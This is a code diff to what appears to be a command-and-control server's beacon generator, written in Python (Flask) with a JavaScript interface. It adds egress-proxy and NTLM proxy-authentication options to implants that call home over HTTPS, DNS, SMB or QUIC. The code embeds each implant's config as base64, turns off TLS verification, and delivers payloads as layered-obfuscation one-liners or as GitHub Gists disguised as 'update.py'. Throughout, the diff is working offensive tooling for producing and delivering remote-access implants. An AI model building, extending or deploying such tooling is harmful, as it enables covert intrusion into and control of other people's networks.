@@ -197,6 +197,60 @@ def _load_state(data_dir: Path):
             task_queues.setdefault(aid, [])
 
 
+# ── Beacon generator helpers ──
+
+def _proxy_config_from_body(body: dict) -> dict:
+    """Build the beacon's proxy config block from a generator request."""
+    proxy = body.get("proxy") or {}
+    mode = proxy.get("mode", "auto")
+    if mode not in ("auto", "manual", "none"):
+        mode = "auto"
+
+    ntlm = proxy.get("ntlm") or {}
+    return {
+        "mode": mode,
+        "url": (proxy.get("url") or "").strip(),
+        "ntlm": {
+            "enabled": bool(ntlm.get("enabled")),
+            "host": (ntlm.get("host") or "").strip(),
+            "port": int(ntlm.get("port") or 8080),
+            "domain": (ntlm.get("domain") or "").strip(),
+            "username": ntlm.get("username") or "",
+            "password": ntlm.get("password") or "",
+            "workstation": (ntlm.get("workstation") or "").strip(),
+        },
+    }
+
+
+def _beacon_config_block(gen_cfg: dict, interval: int, jitter: int,
+                         enc_key: str) -> str:
+    """Render the __main__ bootstrap appended to a generated beacon.
+
+    The config travels as a base64 JSON blob rather than inline literals:
+    credentials such as "CORP\\user" contain backslashes and profiles contain
+    JSON booleans, both of which corrupt a quoted-literal embedding.
+    """
+    import textwrap
+
+    cfg_b64 = base64.b64encode(
+        json.dumps(gen_cfg).encode("utf-8")).decode("ascii")
+    return textwrap.dedent(f"""\
+    if __name__=="__main__":
+        import base64 as _b64,json as _j
+        _p=_j.loads(_b64.b64decode("{cfg_b64}").decode("utf-8"))
+        _cfg={{"c2":{{"beacon_interval_seconds":{interval},"jitter_percent":{jitter},
+        "https":_p["https"],"dns":_p["dns"],"smb":_p["smb"],"quic":_p["quic"],
+        "encryption_key":"{enc_key}",
+        "proxy":_p["proxy"],
+        "c2_profile":_p["c2_profile"]}}}}
+        b=Beacon(_cfg);b.start()
+        try:
+            import time
+            while True: time.sleep(60)
+        except KeyboardInterrupt: b.stop()
+    """)
+
+
 # ── Flask app ──
 
 
@@ -825,7 +879,7 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
     @app.route("/api/server/beacon-gen", methods=["POST"])
     @require_auth
     def api_beacon_gen():
-        import zlib, random as _r, string, textwrap
+        import zlib, random as _r, string
         body = request.get_json(silent=True) or {}
         c2_url = body.get("c2_url", "").strip()
         enc_key = body.get("enc_key", "").strip()
@@ -850,8 +904,7 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
             return jsonify({"error": "beacon.py not found"}), 500
         src = beacon_path.read_text(encoding="utf-8")
 
-        _prof_json = json.dumps(_active_c2_profile) if _active_c2_profile else "{}"
-        proto_cfg = json.dumps({
+        gen_cfg = {
             "https": {"enabled": bool(https_cfg.get("enabled")),
                       "callback_url": https_cfg.get("callback_url", c2_url),
                       "verify_ssl": False},
@@ -863,22 +916,10 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
                     "server": smb_cfg.get("server", "")},
             "quic": {"enabled": bool(quic_cfg.get("enabled")),
                      "server": quic_cfg.get("server", "")},
-        })
-        config_block = textwrap.dedent(f"""\
-        if __name__=="__main__":
-            import json as _j
-            _p=_j.loads('{proto_cfg}')
-            _cfg={{"c2":{{"beacon_interval_seconds":{interval},"jitter_percent":{jitter},
-            "https":_p["https"],"dns":_p["dns"],"smb":_p["smb"],"quic":_p["quic"],
-            "encryption_key":"{enc_key}",
-            "proxy":{{"mode":"auto","url":""}},
-            "c2_profile":{_prof_json}}}}}
-            b=Beacon(_cfg);b.start()
-            try:
-                import time
-                while True: time.sleep(60)
-            except KeyboardInterrupt: b.stop()
-        """)
+            "proxy": _proxy_config_from_body(body),
+            "c2_profile": _active_c2_profile or {},
+        }
+        config_block = _beacon_config_block(gen_cfg, interval, jitter, enc_key)
 
         payload = src + "\n" + config_block
 
@@ -923,7 +964,7 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
     @app.route("/api/server/beacon-gist", methods=["POST"])
     @require_auth
     def api_beacon_gist():
-        import zlib, random as _r, string, textwrap
+        import zlib, random as _r, string
 
         try:
             check = subprocess.run(["gh", "auth", "status"], capture_output=True, text=True, timeout=10)
@@ -957,8 +998,7 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
             return jsonify({"error": "beacon.py not found"}), 500
         src = beacon_path.read_text(encoding="utf-8")
 
-        _prof_json = json.dumps(_active_c2_profile) if _active_c2_profile else "{}"
-        proto_cfg = json.dumps({
+        gen_cfg = {
             "https": {"enabled": bool(https_cfg.get("enabled")),
                       "callback_url": https_cfg.get("callback_url", c2_url),
                       "verify_ssl": False},
@@ -970,22 +1010,10 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
                     "server": smb_cfg.get("server", "")},
             "quic": {"enabled": bool(quic_cfg.get("enabled")),
                      "server": quic_cfg.get("server", "")},
-        })
-        config_block = textwrap.dedent(f"""\
-        if __name__=="__main__":
-            import json as _j
-            _p=_j.loads('{proto_cfg}')
-            _cfg={{"c2":{{"beacon_interval_seconds":{interval},"jitter_percent":{jitter},
-            "https":_p["https"],"dns":_p["dns"],"smb":_p["smb"],"quic":_p["quic"],
-            "encryption_key":"{enc_key}",
-            "proxy":{{"mode":"auto","url":""}},
-            "c2_profile":{_prof_json}}}}}
-            b=Beacon(_cfg);b.start()
-            try:
-                import time
-                while True: time.sleep(60)
-            except KeyboardInterrupt: b.stop()
-        """)
+            "proxy": _proxy_config_from_body(body),
+            "c2_profile": _active_c2_profile or {},
+        }
+        config_block = _beacon_config_block(gen_cfg, interval, jitter, enc_key)
 
         payload = src + "\n" + config_block
 
@@ -3828,6 +3856,31 @@ async function showBeaconGen(){
     +'<input type="range" id="bg-layers" min="1" max="6" value="3" oninput="document.getElementById(\'bg-lval\').textContent=this.value">'
     +'<span class="bgen-lval" id="bg-lval">3</span>'
     +'</div>'
+    +'<div class="nxc-section" style="padding:8px 0 4px">Egress Proxy</div>'
+    +'<label>Proxy Mode <select id="bg-proxy-mode" onchange="bgProxyChanged()">'
+    +'<option value="auto" selected>Auto-discover (env, registry, PAC/WPAD)</option>'
+    +'<option value="manual">Manual URL</option>'
+    +'<option value="none">Direct connection</option>'
+    +'</select></label>'
+    +'<div id="bg-proxy-url-opts" style="display:none">'
+    +'<label>Proxy URL <input id="bg-proxy-url" placeholder="http://proxy.corp.local:8080"></label>'
+    +'</div>'
+    +'<label class="ave-check" style="margin-top:4px"><input type="checkbox" id="bg-ntlm" onchange="bgProxyChanged()"> NTLM proxy authentication</label>'
+    +'<div id="bg-ntlm-opts" style="display:none">'
+    +'<p style="font-size:10px;color:var(--text2);margin:2px 0 6px">Starts a loopback CONNECT relay on the target that performs the NTLMv2 handshake. Use when the proxy demands NTLM and the account is in a different AD domain.</p>'
+    +'<div style="display:flex;gap:8px">'
+    +'<label style="flex:2">Upstream Proxy Host <input id="bg-ntlm-host" placeholder="empty = auto-discovered"></label>'
+    +'<label style="flex:1">Port <input id="bg-ntlm-port" value="8080" type="number" min="1" max="65535"></label>'
+    +'</div>'
+    +'<div style="display:flex;gap:8px">'
+    +'<label style="flex:1">Domain <input id="bg-ntlm-domain" placeholder="CORP (or use CORP\\user below)"></label>'
+    +'<label style="flex:1">Workstation <input id="bg-ntlm-ws" placeholder="empty = target hostname"></label>'
+    +'</div>'
+    +'<div style="display:flex;gap:8px">'
+    +'<label style="flex:1">Username <input id="bg-ntlm-user" placeholder="alice or CORP\\alice"></label>'
+    +'<label style="flex:1">Password <input id="bg-ntlm-pass" type="password" placeholder="password"></label>'
+    +'</div>'
+    +'</div>'
     +'<div class="nxc-section" style="padding:8px 0 4px">Delivery Method</div>'
     +'<div class="bgen-delivery">'
     +'<label class="bgen-dlabel"><input type="radio" name="bg-delivery" value="inline" checked> <span>Inline one-liner</span></label>'
@@ -3925,6 +3978,46 @@ function bgCollectProtos(){
   return p;
 }
 
+function bgProxyChanged(){
+  const mode = document.getElementById("bg-proxy-mode")?.value || "auto";
+  const urlOpts = document.getElementById("bg-proxy-url-opts");
+  if(urlOpts) urlOpts.style.display = mode==="manual" ? "block" : "none";
+  const ntlmOpts = document.getElementById("bg-ntlm-opts");
+  const ntlmCb = document.getElementById("bg-ntlm");
+  if(ntlmCb) ntlmCb.disabled = mode==="none";
+  if(ntlmOpts) ntlmOpts.style.display = (ntlmCb?.checked && mode!=="none") ? "block" : "none";
+}
+
+function bgCollectProxy(){
+  const mode = document.getElementById("bg-proxy-mode")?.value || "auto";
+  const ntlmOn = !!document.getElementById("bg-ntlm")?.checked && mode!=="none";
+  return {
+    mode: mode,
+    url: document.getElementById("bg-proxy-url")?.value?.trim() || "",
+    ntlm: {
+      enabled: ntlmOn,
+      host: document.getElementById("bg-ntlm-host")?.value?.trim() || "",
+      port: parseInt(document.getElementById("bg-ntlm-port")?.value || "8080", 10) || 8080,
+      domain: document.getElementById("bg-ntlm-domain")?.value?.trim() || "",
+      username: document.getElementById("bg-ntlm-user")?.value || "",
+      password: document.getElementById("bg-ntlm-pass")?.value || "",
+      workstation: document.getElementById("bg-ntlm-ws")?.value?.trim() || ""
+    }
+  };
+}
+
+function bgValidateProxy(proxy){
+  if(proxy.mode==="manual" && !proxy.url){
+    toast("warn","Beacon Gen","Enter the proxy URL or switch to auto-discover",3000);
+    return false;
+  }
+  if(proxy.ntlm.enabled && (!proxy.ntlm.username || !proxy.ntlm.password)){
+    toast("warn","Beacon Gen","NTLM needs a username and password",3000);
+    return false;
+  }
+  return true;
+}
+
 async function runBeaconGen(){
   const protos = bgCollectProtos();
   if(Object.keys(protos).length===0){ toast("warn","Beacon Gen","Select at least one transport protocol",3000); return; }
@@ -3932,6 +4025,8 @@ async function runBeaconGen(){
   if(protos.dns && !protos.dns.domain){ toast("warn","Beacon Gen","Enter the DNS domain",3000); return; }
   if(protos.smb && !protos.smb.server){ toast("warn","Beacon Gen","Enter the SMB server IP",3000); return; }
   if(protos.quic && !protos.quic.server){ toast("warn","Beacon Gen","Enter the QUIC server address",3000); return; }
+  const proxy = bgCollectProxy();
+  if(!bgValidateProxy(proxy)) return;
   const delivery = document.querySelector('input[name="bg-delivery"]:checked')?.value || "inline";
   if(delivery==="gist") return runBeaconGist();
   const key = document.getElementById("bg-key")?.value?.trim() || "";
@@ -3943,7 +4038,7 @@ async function runBeaconGen(){
   try{
     const data = await api("/api/server/beacon-gen", {
       method:"POST",
-      body:JSON.stringify({c2_url:protos.https?.callback_url||"", enc_key:key, interval, jitter, layers, protocols:protos})
+      body:JSON.stringify({c2_url:protos.https?.callback_url||"", enc_key:key, interval, jitter, layers, protocols:protos, proxy:proxy})
     });
     if(data.error){ toast("err","Beacon Gen",data.error,4000); return; }
     const container = document.getElementById("bg-result");
@@ -3983,12 +4078,14 @@ async function runBeaconGist(){
   const jitter = document.getElementById("bg-jitter")?.value || "20";
   const layers = document.getElementById("bg-layers")?.value || "3";
   const filename = document.getElementById("bg-gist-fn")?.value?.trim() || "update.py";
+  const proxy = bgCollectProxy();
+  if(!bgValidateProxy(proxy)) return;
   const btn = document.querySelector(".ave-run");
   if(btn){ btn.disabled=true; btn.textContent="Creating Gist..."; }
   try{
     const data = await api("/api/server/beacon-gist", {
       method:"POST",
-      body:JSON.stringify({c2_url:url, enc_key:key, interval, jitter, layers, filename, protocols:protos})
+      body:JSON.stringify({c2_url:url, enc_key:key, interval, jitter, layers, filename, protocols:protos, proxy:proxy})
     });
     if(data.error){ toast("err","Beacon Gist",data.error,5000); return; }
     const container = document.getElementById("bg-result");
